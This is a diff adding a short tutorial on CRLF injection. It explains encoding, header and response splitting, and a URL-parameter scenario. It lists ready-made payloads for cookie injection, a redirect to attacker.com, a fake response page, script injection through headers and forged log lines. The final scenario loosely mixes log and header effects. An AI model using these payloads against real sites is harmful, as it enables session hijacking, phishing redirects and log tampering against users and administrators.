@@ -1,0 +1,87 @@
+CRLF Injection: Explanation and Payloads
+1. What is CRLF Injection?
+CRLF Injection occurs when an attacker inserts Carriage Return (\r or %0d) and Line Feed (\n or %0a) characters into input fields, leading to unintended manipulation of HTTP headers or logs.
+
+\r (Carriage Return) = %0d (URL Encoded)
+
+\n (Line Feed) = %0a (URL Encoded)
+
+Combined: \r\n = %0d%0a
+
+2. How Does CRLF Injection Work?
+When an application improperly handles user input in headers or logs, an attacker can break the intended structure and inject additional HTTP headers, cookies, or even JavaScript.
+
+Example of a normal HTTP response:
+
+pgsql
+Copy
+Edit
+HTTP/1.1 200 OK
+Content-Type: text/html
+Set-Cookie: session=abcd1234
+Now, if an attacker injects \r\n, they can modify headers like this:
+
+pgsql
+Copy
+Edit
+HTTP/1.1 200 OK
+Content-Type: text/html
+Set-Cookie: session=abcd1234
+Set-Cookie: session=hacked   <-- Injected malicious header
+3. Common CRLF Injection Payloads
+A. Injecting a New Header (Cookie Manipulation)
+css
+Copy
+Edit
+%0d%0aSet-Cookie: session=evil; HttpOnly
+📌 Effect: This adds a new cookie that can be used for session hijacking.
+
+B. Injecting a Redirect (Location Header Manipulation)
+perl
+Copy
+Edit
+%0d%0aLocation: https://attacker.com
+📌 Effect: This forces the victim to be redirected to a malicious site.
+
+C. HTTP Response Splitting (Injecting a Fake Page)
+perl
+Copy
+Edit
+%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<h1>Hacked!</h1>
+📌 Effect: The attacker injects an entirely new response to execute phishing or fake pages.
+
+D. Injecting JavaScript (XSS via Headers)
+php-template
+Copy
+Edit
+%0d%0aContent-Length: 0%0d%0a%0d%0a<script>alert('CRLF Attack!')</script>
+📌 Effect: If JavaScript injection is successful, this could lead to Cross-Site Scripting (XSS) attacks.
+
+E. Log Injection (Tampering with Logs)
+sql
+Copy
+Edit
+User-Agent: normal-user%0d%0aERROR: User hacked the system%0d%0a
+📌 Effect: Injects fake error messages into server logs, misleading administrators.
+
+4. Example Attack Scenario
+Scenario: Vulnerable URL Parameter
+A website logs user search queries:
+
+arduino
+Copy
+Edit
+https://example.com/search?query=hello
+If this is vulnerable, an attacker could inject:
+
+perl
+Copy
+Edit
+https://example.com/search?query=hello%0d%0aSet-Cookie:%20admin=true
+Now, the server might process:
+
+pgsql
+Copy
+Edit
+Search: hello
+Set-Cookie: admin=true
